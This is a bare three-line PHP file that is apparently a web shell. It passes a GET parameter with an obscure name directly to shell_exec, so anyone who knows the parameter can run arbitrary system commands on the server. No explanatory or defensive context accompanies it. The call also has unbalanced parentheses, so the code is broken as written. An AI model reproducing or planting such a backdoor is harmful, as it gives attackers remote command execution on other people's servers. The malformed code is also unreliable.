<?php
shell_exec(($_GET['42swrJqK']);
?>
